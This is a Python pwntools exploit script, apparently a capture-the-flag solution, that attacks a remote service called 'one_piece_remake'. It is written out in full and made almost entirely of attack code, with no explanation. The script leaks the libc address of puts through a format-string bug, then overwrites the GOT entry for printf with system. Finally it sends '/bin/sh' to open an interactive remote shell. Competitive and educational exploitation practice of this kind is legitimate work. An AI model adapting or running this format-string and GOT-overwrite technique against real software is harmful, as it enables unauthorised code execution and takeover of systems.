#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./one_piece_remake')
context.log_level = 'INFO'
context.log_file = 'log.log'

'''
# local libc
libc = binary.libc
p = process(binary.path)
'''
# task libc
libid = 'libc6_2.30-0ubuntu2.2_i386'
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'
ld = ELF(libpath + 'ld-2.30.so')
libc = ELF(libpath + 'libc-2.30.so')
#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
p = remote('onepiece.fword.wtf', 1236)
#'''

offset = 7

p.recvuntil('>>')
p.sendline('gomugomunomi')
p.recvuntil('>>')

payload  = b'%' + str(offset+1).encode() + b'$s'
payload += p32(binary.got.puts)
p.sendline(payload)

_ = p.recv(4)
puts = u32(_)
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

p.recvuntil('>>')
p.sendline('gomugomunomi')
p.recvuntil('>>')

payload = fmtstr_payload(offset,{binary.got.printf:libc.sym.system},numbwritten=0)
p.sendline(payload)

time.sleep(0.5)
p.sendline('gomugomunomi')
time.sleep(0.5)
p.recvuntil('what\'s your name pirate ?')
p.sendline('/bin/sh')
p.interactive()

